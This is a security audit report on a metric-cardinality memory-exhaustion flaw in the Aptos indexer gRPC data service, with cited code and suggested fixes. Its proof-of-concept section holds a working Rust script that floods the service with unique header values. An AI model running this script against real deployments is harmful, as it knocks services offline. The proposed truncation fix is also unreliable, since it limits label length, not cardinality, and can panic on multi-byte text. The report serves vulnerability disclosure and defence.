# Audit Report

## Title
Unbounded Metric Cardinality in Indexer gRPC Data Service Enables Memory Exhaustion DoS

## Summary
The indexer-grpc-data-service accepts user-controlled gRPC headers (`x-aptos-identifier-type`, `x-aptos-identifier`, `x-aptos-email`, `x-aptos-application-name`, `x-aptos-request-name`) without validation and uses them directly as Prometheus metric labels. An attacker who can reach the service directly (bypassing any API Gateway) can create unlimited unique label combinations, causing unbounded metric cardinality and memory exhaustion, resulting in service denial.

## Finding Description

The vulnerability exists in how the indexer-grpc-data-service collects metrics. The service defines metrics with five high-cardinality labels: [1](#0-0) 

These label values are extracted from gRPC request headers without any validation or sanitization: [2](#0-1) 

The extraction logic defaults to "unspecified" if headers are missing, but performs no validation on header content length, character set, or cardinality. The labels are then used throughout the service: [3](#0-2) 

**Attack Path:**
1. Attacker establishes gRPC connections to the data service
2. For each connection, attacker sets unique values for the 5 header fields (identifier_type, identifier, email, application_name, processor)
3. Each unique combination creates new Prometheus metric time series for all affected metrics (LATEST_PROCESSED_VERSION_PER_PROCESSOR, PROCESSED_VERSIONS_COUNT_PER_PROCESSOR, PROCESSED_LATENCY_IN_SECS_PER_PROCESSOR, CONNECTION_COUNT, SHORT_CONNECTION_COUNT, BYTES_READY_TO_TRANSFER_FROM_SERVER, NUM_TRANSACTIONS_STRIPPED)
4. With no cardinality bounds, memory consumption grows unbounded until OOM

**Why This Bypasses Intended Security:**

The service configuration shows deprecated authentication fields: [4](#0-3) 

Comments indicate these headers should come from an API Gateway: [5](#0-4) 

However, the service implementation adds no interceptor to validate header authenticity, and the comment claiming authentication has occurred is misleading: [6](#0-5) 

## Impact Explanation

This qualifies as **High Severity** under the Aptos Bug Bounty program's "API crashes" category. While the indexer-grpc-data-service is not part of core consensus, it is a critical infrastructure component for:
- Downstream indexer processors that depend on transaction data
- Applications monitoring blockchain state
- Analytics platforms and explorers

Memory exhaustion will cause:
1. Service crashes and restart loops
2. Loss of indexing availability for all connected clients
3. Potential cascading failures if monitoring/alerting systems depend on these metrics
4. Operational burden requiring manual intervention to clear metrics and restart

The vulnerability violates the **Resource Limits invariant** (Invariant #9): "All operations must respect gas, storage, and computational limits" - in this case, memory limits for metrics storage.

## Likelihood Explanation

**Likelihood: Medium to High** depending on network architecture.

**Factors increasing likelihood:**
- No authentication enforcement in current code (deprecated fields)
- No input validation on header values
- No cardinality limits on metrics
- Attack is trivial to execute (basic gRPC client)
- Each connection can contribute new metric series

**Factors decreasing likelihood:**
- Service may be deployed behind API Gateway in production
- Network-level controls (VPC, firewall) may restrict access
- Proper production deployment should not expose service directly

However, the vulnerability exists in the code regardless of deployment, and misconfigurations or development/testing environments may expose the service.

## Recommendation

Implement multi-layered protection:

**1. Add cardinality limits using metric label bounds:**
```rust
pub fn get_label_values(&self) -> Vec<String> {
    const MAX_LABEL_LENGTH: usize = 128;
    vec![
        truncate_label(&self.request_identifier_type, MAX_LABEL_LENGTH),
        truncate_label(&self.request_identifier, MAX_LABEL_LENGTH),
        truncate_label(&self.request_email, MAX_LABEL_LENGTH),
        truncate_label(&self.request_application_name, MAX_LABEL_LENGTH),
        truncate_label(&self.processor_name, MAX_LABEL_LENGTH),
    ]
}

fn truncate_label(value: &str, max_len: usize) -> String {
    if value.len() > max_len {
        format!("{}...[truncated]", &value[..max_len])
    } else {
        value.to_string()
    }
}
```

**2. Implement authentication interceptor:**
```rust
// In config.rs, add back proper authentication
fn create_auth_interceptor(tokens: Vec<String>) -> impl tonic::service::Interceptor {
    move |req: tonic::Request<()>| {
        let metadata = req.metadata();
        if let Some(token) = metadata.get("x-aptos-data-authorization") {
            if tokens.contains(&token.to_str().unwrap_or("").to_string()) {
                Ok(req)
            } else {
                Err(tonic::Status::unauthenticated("Invalid token"))
            }
        } else {
            Err(tonic::Status::unauthenticated("Missing token"))
        }
    }
}
```

**3. Use metrics relabeling in Prometheus configuration to drop high-cardinality labels if needed**

**4. Add rate limiting per client IP/identifier**

## Proof of Concept

```rust
// PoC: Metric cardinality explosion attack
use tonic::metadata::MetadataValue;
use tonic::Request;
use aptos_protos::indexer::v1::{raw_data_client::RawDataClient, GetTransactionsRequest};

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let channel = tonic::transport::Channel::from_static("http://[DATA_SERVICE_IP]:50051")
        .connect()
        .await?;
    
    // Create 1000 connections with unique header combinations
    for i in 0..1000 {
        let mut client = RawDataClient::new(channel.clone());
        
        let mut request = Request::new(GetTransactionsRequest {
            starting_version: Some(0),
            transactions_count: Some(10),
            ..Default::default()
        });
        
        // Set unique headers to create new metric series
        let metadata = request.metadata_mut();
        metadata.insert("x-aptos-identifier-type", 
            MetadataValue::from_str(&format!("attacker-type-{}", i))?);
        metadata.insert("x-aptos-identifier", 
            MetadataValue::from_str(&format!("attacker-id-{}", i))?);
        metadata.insert("x-aptos-email", 
            MetadataValue::from_str(&format!("attacker-{}@evil.com", i))?);
        metadata.insert("x-aptos-application-name", 
            MetadataValue::from_str(&format!("attack-app-{}", i))?);
        metadata.insert("x-aptos-request-name", 
            MetadataValue::from_str(&format!("processor-{}", i))?);
        
        // Each connection creates 7 new metric time series (one per metric definition)
        // 1000 connections = 7000 new time series
        // Each time series consumes ~3KB in Prometheus
        // Total: ~21MB for 1000 connections
        // Scale to 100K connections = ~2.1GB memory
        
        let _stream = client.get_transactions(request).await?;
        println!("Created metric series {}", i);
    }
    
    println!("Attack complete. Check service memory usage.");
    Ok(())
}
```

## Notes

This vulnerability specifically affects the indexer-grpc-data-service auxiliary infrastructure component, not core blockchain consensus or execution. The service is designed to operate behind an API Gateway that validates these headers, but the service code itself lacks defensive validation. In production deployments with proper network segmentation, the attack surface is limited. However, the vulnerability represents a defense-in-depth failure that could be exploited in misconfigured deployments or development environments.

### Citations

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service/src/metrics.rs (L14-27)
```rust
pub static LATEST_PROCESSED_VERSION_PER_PROCESSOR: Lazy<IntGaugeVec> = Lazy::new(|| {
    register_int_gauge_vec!(
        "indexer_grpc_data_service_with_user_latest_processed_version",
        "Latest processed transaction version",
        &[
            "identifier_type",
            "identifier",
            "email",
            "application_name",
            "processor"
        ],
    )
    .unwrap()
});
```

**File:** ecosystem/indexer-grpc/indexer-grpc-utils/src/constants.rs (L23-24)
```rust
// These come from API Gateway, see here:
// https://github.com/aptos-labs/api-gateway/blob/0aae1c17fbd0f5e9b50bdb416f62b48d3d1d5e6b/src/common.rs
```

**File:** ecosystem/indexer-grpc/indexer-grpc-utils/src/constants.rs (L72-106)
```rust
pub fn get_request_metadata(req: &Request<GetTransactionsRequest>) -> IndexerGrpcRequestMetadata {
    let request_metadata_pairs = vec![
        (
            "request_identifier_type",
            REQUEST_HEADER_APTOS_IDENTIFIER_TYPE,
        ),
        ("request_identifier", REQUEST_HEADER_APTOS_IDENTIFIER),
        ("request_email", REQUEST_HEADER_APTOS_EMAIL),
        (
            "request_application_name",
            REQUEST_HEADER_APTOS_APPLICATION_NAME,
        ),
        ("request_token", GRPC_AUTH_TOKEN_HEADER),
        ("processor_name", GRPC_REQUEST_NAME_HEADER),
    ];
    let mut request_metadata_map: HashMap<String, String> = request_metadata_pairs
        .into_iter()
        .map(|(key, value)| {
            (
                key.to_string(),
                req.metadata()
                    .get(value)
                    .map(|value| value.to_str().unwrap_or("unspecified").to_string())
                    .unwrap_or("unspecified".to_string()),
            )
        })
        .collect();
    request_metadata_map.insert(
        "request_connection_id".to_string(),
        Uuid::new_v4().to_string(),
    );

    // TODO: update the request name if these are internal requests.
    serde_json::from_str(&serde_json::to_string(&request_metadata_map).unwrap()).unwrap()
}
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service/src/service.rs (L149-150)
```rust
        // Get request identity. The request is already authenticated by the interceptor.
        let request_metadata = get_request_metadata(&req);
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service/src/service.rs (L548-558)
```rust
                LATEST_PROCESSED_VERSION_PER_PROCESSOR
                    .with_label_values(&request_metadata.get_label_values())
                    .set(end_of_batch_version as i64);
                PROCESSED_VERSIONS_COUNT_PER_PROCESSOR
                    .with_label_values(&request_metadata.get_label_values())
                    .inc_by(current_batch_size as u64);
                if let Some(data_latency_in_secs) = data_latency_in_secs {
                    PROCESSED_LATENCY_IN_SECS_PER_PROCESSOR
                        .with_label_values(&request_metadata.get_label_values())
                        .set(data_latency_in_secs);
                }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service/src/config.rs (L58-63)
```rust
    /// Deprecated: a list of auth tokens that are allowed to access the service.
    #[serde(default)]
    pub whitelisted_auth_tokens: Vec<String>,
    /// Deprecated: if set, don't check for auth tokens.
    #[serde(default)]
    pub disable_auth_check: bool,
```
